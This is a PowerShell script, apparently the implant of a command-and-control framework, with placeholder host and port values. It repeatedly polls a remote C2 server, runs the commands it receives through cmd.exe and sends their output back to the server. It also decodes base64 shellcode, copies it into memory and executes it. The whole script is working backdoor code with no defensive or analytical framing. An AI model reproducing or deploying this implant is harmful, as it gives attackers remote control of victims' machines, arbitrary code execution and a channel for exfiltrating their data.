# Define the URL for the command-and-control server and the client ID

$C2_URL = 'http://{lhost}:{lport}'
$CLIENT_ID = '{line}' 
# Function to send a request to the C2 server
function Send-Request {
    param (
        [string]$url,
        [string]$method = 'GET',
        [string]$body = ''
    )

    try {
        if ($method -eq 'GET') {
            $response = Invoke-RestMethod -Uri $url -Method Get
        } elseif ($method -eq 'POST') {
            $headers = @{ 'Content-Type' = 'application/json' }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
        }
        return $response
    } catch {
        Write-Error "Error: $_"
    }
}


function Escn {
    param (
        [string]$shellcode
    )

    $shellcodeBytes = [System.Convert]::FromBase64String($shellcode)
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcodeBytes.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcodeBytes, 0, $buffer, $shellcodeBytes.Length)
    $function = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer([System.IntPtr]$buffer, [System.Runtime.InteropServices.CallingConvention]::Cdecl)
    $function.Invoke()
}

while ($true) {
    try {
        $command = Send-Request "$C2_URL/command/$CLIENT_ID"

        if ($command) {
            if ($command -match 'terminate') {
                break
            } elseif ($command -match '^sc:') {
                $sc = $command -replace '^sc:', ''
                Escn $sc
            } else {
                $output = cmd.exe /c $command 2>&1
                $json_data = @{ output = $output } | ConvertTo-Json
                Send-Request "$C2_URL/command/$CLIENT_ID" -method 'POST' -body $json_data
            }
        }

        Start-Sleep -Seconds 5
    } catch {
        Write-Error "Error: $_"
        break
    }
}